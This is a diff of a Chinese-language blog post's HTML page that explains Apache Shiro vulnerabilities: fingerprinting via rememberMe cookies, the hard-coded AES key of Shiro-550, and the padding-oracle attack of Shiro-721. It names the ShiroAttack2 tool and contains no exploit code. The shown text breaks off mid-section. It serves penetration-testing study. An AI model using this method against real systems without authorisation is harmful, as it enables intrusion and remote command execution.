@@ -8,49 +8,46 @@
 	
 		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 	
-	<meta name="description" content="前言：在平时测一些站点的时候，几乎都会有登录框或者一些权限存在区分的地方，在这些地方大部分又是使用shiro框架来负责权限操作的；网上的一些原理或者操作太过抽象和分散，于是这篇文章就是谈谈shiro框架的一些漏洞合集和简单分析。 首先什么是shiro框架呢？Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，用于处理身份验证、授权、加密和会话管理等核心安全性问题。Shiro">
+	<meta name="description" content="对于 shiro 框架的漏洞，我们本篇分为反序列化与权限绕过来阐述 首先什么是 shiro 框架呢？Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，用于处理身份验证、授权、加密和会话管理等核心安全性问题。Shiro 可以在 JavaSE 和 JavaEE 环境中使用，帮助开发人员快速构建安全的应用程序。 shiro 反序列化web 端特征 未登陆的情况下，请求包的 co">
 <meta property="og:type" content="article">
 <meta property="og:title" content="shiro框架的加密分析和总结">
 <meta property="og:url" content="https://wb-ldong.github.io/2026/10/22/shiro%E6%A1%86%E6%9E%B6%E7%9A%84%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90%E5%92%8C%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="Roam的博客">
-<meta property="og:description" content="前言：在平时测一些站点的时候，几乎都会有登录框或者一些权限存在区分的地方，在这些地方大部分又是使用shiro框架来负责权限操作的；网上的一些原理或者操作太过抽象和分散，于是这篇文章就是谈谈shiro框架的一些漏洞合集和简单分析。 首先什么是shiro框架呢？Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，用于处理身份验证、授权、加密和会话管理等核心安全性问题。Shiro">
+<meta property="og:description" content="对于 shiro 框架的漏洞，我们本篇分为反序列化与权限绕过来阐述 首先什么是 shiro 框架呢？Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，用于处理身份验证、授权、加密和会话管理等核心安全性问题。Shiro 可以在 JavaSE 和 JavaEE 环境中使用，帮助开发人员快速构建安全的应用程序。 shiro 反序列化web 端特征 未登陆的情况下，请求包的 co">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://wb-ldong.github.io/images/shiro-iv-key.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/shiro-cookie-format.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/19.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/20.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/shiro-iv-key.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/21.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/22.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/23.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/24.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/25.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/26.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/27.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/28.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/29.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/31.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/32.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/33.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/34.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/35.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/36.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/37.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/38.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/39.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/41.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/42.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/43.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/44.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/45.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/46.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/47.png">
-<meta property="og:image" content="https://wb-ldong.github.io/images/48.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/1.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/2.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/3.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/4.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/5.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/6.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/7.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/8.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/9.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/10.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/11.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/12.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/13.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/14.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/15.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/16.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/17.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/18.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/19.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/20.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/21.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/22.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/23.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/24.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/25.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/26.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/27.png">
+<meta property="og:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/28.png">
 <meta property="article:published_time" content="2026-10-22T06:53:35.000Z">
-<meta property="article:modified_time" content="2026-10-22T07:25:08.655Z">
+<meta property="article:modified_time" content="2026-10-22T08:10:20.326Z">
 <meta property="article:author" content="wb-ldong">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://wb-ldong.github.io/images/shiro-iv-key.png">
+<meta name="twitter:image" content="https://wb-ldong.github.io/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/1.png">
 
 	<meta name="theme-color" content="#5e72e4">
 	<meta name="theme-color-rgb" content="94,114,228">
@@ -640,7 +637,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-time">
 							<i class="fa fa-clock-o" aria-hidden="true"></i>
-							<time title="发布于 2026-10-22 14:53:35 | 编辑于 2026-10-22 15:25:08">2026-10-22 14:53
+							<time title="发布于 2026-10-22 14:53:35 | 编辑于 2026-10-22 16:10:20">2026-10-22 14:53
 							</time>
 						</div>
 					
@@ -649,7 +646,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-words">
 							<i class="fa fa-file-word-o" aria-hidden="true"></i>
-							1.5k 字
+							1.9k 字
 						</div>
 					
 		</div>
@@ -658,150 +655,178 @@
 
 	<div class="post-content" id="post_content">
 		<blockquote>
-<h3 id="前言：在平时测一些站点的时候，几乎都会有登录框或者一些权限存在区分的地方，在这些地方大部分又是使用shiro框架来负责权限操作的；网上的一些原理或者操作太过抽象和分散，于是这篇文章就是谈谈shiro框架的一些漏洞合集和简单分析。"><a href="#前言：在平时测一些站点的时候，几乎都会有登录框或者一些权限存在区分的地方，在这些地方大部分又是使用shiro框架来负责权限操作的；网上的一些原理或者操作太过抽象和分散，于是这篇文章就是谈谈shiro框架的一些漏洞合集和简单分析。" class="headerlink" title="前言：在平时测一些站点的时候，几乎都会有登录框或者一些权限存在区分的地方，在这些地方大部分又是使用shiro框架来负责权限操作的；网上的一些原理或者操作太过抽象和分散，于是这篇文章就是谈谈shiro框架的一些漏洞合集和简单分析。"></a><strong>前言：在平时测一些站点的时候，几乎都会有登录框或者一些权限存在区分的地方，在这些地方大部分又是使用shiro框架来负责权限操作的；网上的一些原理或者操作太过抽象和分散，于是这篇文章就是谈谈shiro框架的一些漏洞合集和简单分析。</strong></h3></blockquote>
-<h2 id="首先什么是shiro框架呢？"><a href="#首先什么是shiro框架呢？" class="headerlink" title="首先什么是shiro框架呢？"></a>首先什么是shiro框架呢？</h2><p>Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，用于处理<strong>身份验证、授权、加密和会话管理</strong>等核心安全性问题。Shiro 可以在 JavaSE 和 JavaEE 环境中使用，帮助开发人员快速构建安全的应用程序。</p>
-<p>（对于shiro框架的漏洞，我们本篇分为反序列化与权限绕过来阐述）</p>
-<h2 id="shiro反序列化（CBC加密算法：明文-IMV-XOR-前一块密文）："><a href="#shiro反序列化（CBC加密算法：明文-IMV-XOR-前一块密文）：" class="headerlink" title="shiro反序列化（CBC加密算法：明文 &#x3D; IMV XOR 前一块密文）："></a>shiro反序列化（CBC加密算法：明文 &#x3D; IMV XOR 前一块密文）：</h2><h3 id="web端特征："><a href="#web端特征：" class="headerlink" title="web端特征："></a>web端特征：</h3><ul>
-<li><p>未登陆的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段</p>
-</li>
-<li><p>登陆失败的话，不管勾选RememberMe字段没有，返回包都会有rememberMe&#x3D;deleteMe字段</p>
-</li>
-<li><p>不勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe&#x3D;deleteMe字段。但是之后的所有请求中Cookie都不会有rememberMe字段</p>
-</li>
-<li><p>勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe&#x3D;deleteMe字段，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段</p>
-</li>
+<h2 id="对于-shiro-框架的漏洞，我们本篇分为反序列化与权限绕过来阐述"><a href="#对于-shiro-框架的漏洞，我们本篇分为反序列化与权限绕过来阐述" class="headerlink" title="对于 shiro 框架的漏洞，我们本篇分为反序列化与权限绕过来阐述"></a>对于 shiro 框架的漏洞，我们本篇分为反序列化与权限绕过来阐述</h2></blockquote>
+<h1 id="首先什么是-shiro-框架呢？"><a href="#首先什么是-shiro-框架呢？" class="headerlink" title="首先什么是 shiro 框架呢？"></a>首先什么是 shiro 框架呢？</h1><p>Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，用于处理<strong>身份验证、授权、加密和会话管理</strong>等核心安全性问题。Shiro 可以在 JavaSE 和 JavaEE 环境中使用，帮助开发人员快速构建安全的应用程序。</p>
+<h2 id="shiro-反序列化"><a href="#shiro-反序列化" class="headerlink" title="shiro 反序列化"></a>shiro 反序列化</h2><h3 id="web-端特征"><a href="#web-端特征" class="headerlink" title="web 端特征"></a>web 端特征</h3><ul>
+<li>未登陆的情况下，请求包的 cookie 中没有 rememberMe 字段，返回包 set-Cookie 里也没有 deleteMe 字段</li>
+<li>登陆失败的话，不管勾选 RememberMe 字段没有，返回包都会有 rememberMe&#x3D;deleteMe 字段</li>
+<li>不勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe&#x3D;deleteMe 字段。但是之后的所有请求中 Cookie 都不会有 rememberMe 字段</li>
+<li>勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe&#x3D;deleteMe 字段，还会有 rememberMe 字段，之后的所有请求中 Cookie 都会有 rememberMe 字段</li>
 </ul>
-<h3 id="类型一：Shiro-550（CVE-2016-4437）漏洞原理"><a href="#类型一：Shiro-550（CVE-2016-4437）漏洞原理" class="headerlink" title="类型一：Shiro-550（CVE-2016-4437）漏洞原理"></a>类型一：Shiro-550（CVE-2016-4437）漏洞原理</h3><p><strong>——————————————————————————————–</strong></p>
-<p><strong>|               随机IV作为初始向量，AES密钥****硬编码在代码中</strong>                                          <strong>|</strong></p>
-<p>-<img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro-iv-key.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img">——————————————————————————————-</p>
+<h3 id="类型一：Shiro-550（CVE-2016-4437）漏洞原理"><a href="#类型一：Shiro-550（CVE-2016-4437）漏洞原理" class="headerlink" title="类型一：Shiro-550（CVE-2016-4437）漏洞原理"></a>类型一：Shiro-550（CVE-2016-4437）漏洞原理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">随机 IV 作为初始向量，AES 密钥硬编码在代码中</span><br></pre></td></tr></table></figure>
 
-<p>系统分配的cookie的加密格式：</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  src="/images/shiro-cookie-format.png" alt="img"><img data-original="/images/19.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>系统分配的 cookie 的加密格式：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/1.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
 <h4 id="（1）漏洞影响范围"><a href="#（1）漏洞影响范围" class="headerlink" title="（1）漏洞影响范围"></a>（1）漏洞影响范围</h4><ul>
-<li><p>Apache Shiro &lt;&#x3D; <strong>1.2.4</strong> </p>
-</li>
-<li><p>默认使用 <code>CookieRememberMeManager</code> 处理 <code>rememberMe</code> Cookie</p>
-</li>
+<li>Apache Shiro &lt;&#x3D; <strong>1.2.4</strong></li>
+<li>默认使用 <code>CookieRememberMeManager</code> 处理 <code>rememberMe</code> Cookie</li>
 </ul>
 <h4 id="（2）漏洞原理"><a href="#（2）漏洞原理" class="headerlink" title="（2）漏洞原理"></a>（2）漏洞原理</h4><ul>
-<li>Shiro-550 存在于 rememberMe 机制的处理流程：</li>
+<li>Shiro-550 存在于 rememberMe 机制的处理流程：<ul>
+<li>用户登录后，Shiro 会将用户信息 序列化 -&gt; AES 加密 -&gt; Base64 编码 后存入 rememberMe Cookie。</li>
+<li>服务器收到请求时，会 Base64 解码 -&gt; AES 解密 -&gt; 反序列化，恢复用户信息。</li>
+<li>问题在于：Shiro 默认使用的 AES 密钥是硬编码的！</li>
 </ul>
-<p>​        用户登录后，Shiro 会将用户信息 序列化 -&gt; AES 加密 -&gt; Base64 编码 后存入 rememberMe Cookie。</p>
-<p>​        服务器收到请求时，会 Base64 解码 -&gt; AES 解密 -&gt; 反序列化，恢复用户信息。</p>
-<p>​        问题在于：Shiro 默认使用的 AES 密钥是硬编码的！</p>
-<h4 id="（3）总结："><a href="#（3）总结：" class="headerlink" title="（3）总结："></a>（3）总结：</h4><ul>
+</li>
+</ul>
+<h4 id="（3）总结"><a href="#（3）总结" class="headerlink" title="（3）总结"></a>（3）总结</h4><ul>
 <li>因为是硬编码，所以常见的利用方式就是爆破密钥，然后爆破利用链子，命令执行。</li>
 </ul>
-<h4 id="（4）工具使用："><a href="#（4）工具使用：" class="headerlink" title="（4）工具使用："></a>（4）工具使用：</h4><ul>
+<h4 id="（4）工具使用"><a href="#（4）工具使用" class="headerlink" title="（4）工具使用"></a>（4）工具使用</h4><ul>
 <li><a target="_blank" rel="noopener" href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a></li>
 </ul>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/20.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/2.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<h4 id="类型二：Shiro-721（CVE-2019-12422）漏洞原理"><a href="#类型二：Shiro-721（CVE-2019-12422）漏洞原理" class="headerlink" title="类型二：Shiro-721（CVE-2019-12422）漏洞原理"></a><strong>类型二：Shiro-721（CVE-2019-12422）漏洞原理</strong></h4><p><strong>———————————————————————————————-</strong></p>
-<p>**|（<strong><strong>必须</strong></strong>有一个有效的 rememberMe Cookie）** ；*<em>随机IV作为初始向量，<strong><strong>随机</strong></strong>AES密钥  |</em>*</p>
-<p>-<img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro-iv-key.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img">———————————————————————————————</p>
+<h3 id="类型二：Shiro-721（CVE-2019-12422）漏洞原理"><a href="#类型二：Shiro-721（CVE-2019-12422）漏洞原理" class="headerlink" title="类型二：Shiro-721（CVE-2019-12422）漏洞原理"></a>类型二：Shiro-721（CVE-2019-12422）漏洞原理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">必须有一个有效的 rememberMe Cookie；随机 IV 作为初始向量，随机 AES 密钥</span><br></pre></td></tr></table></figure>
 
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/21.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>系统分配的 cookie 的加密格式：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/3.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
 <h4 id="（1）漏洞影响范围-1"><a href="#（1）漏洞影响范围-1" class="headerlink" title="（1）漏洞影响范围"></a>（1）漏洞影响范围</h4><ul>
 <li>Apache Shiro <strong>&lt; 1.4.2</strong></li>
 </ul>
 <h4 id="（2）漏洞原理-1"><a href="#（2）漏洞原理-1" class="headerlink" title="（2）漏洞原理"></a>（2）漏洞原理</h4><ul>
-<li>Shiro-721 主要是由于 AES-128-CBC 加密的 Padding Oracle 攻击：</li>
+<li>Shiro-721 主要是由于 AES-128-CBC 加密的 Padding Oracle 攻击：<ul>
+<li>攻击者可以利用服务器返回的错误信息，逐步猜测加密数据，破解 AES 密钥。</li>
+<li>拿到密钥后，攻击者可以伪造恶意 Cookie，实现反序列化攻击。</li>
 </ul>
-<p>​      攻击者可以利用服务器返回的错误信息，逐步猜测加密数据，破解 AES 密钥。</p>
-<p>​      拿到密钥后，攻击者可以 伪造恶意 Cookie，实现反序列化攻击。</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/22.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+</li>
+</ul>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/4.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
 <h4 id="（3）攻击过程分析"><a href="#（3）攻击过程分析" class="headerlink" title="（3）攻击过程分析"></a>（3）攻击过程分析</h4><p><strong>前置知识：</strong></p>
-<p><strong>服务器收到Cookie密文 解密的操作：最主要检测的是P的填充</strong></p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/23.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p><strong>服务器收到 Cookie 密文解密的操作：最主要检测的是 P 的填充</strong></p>
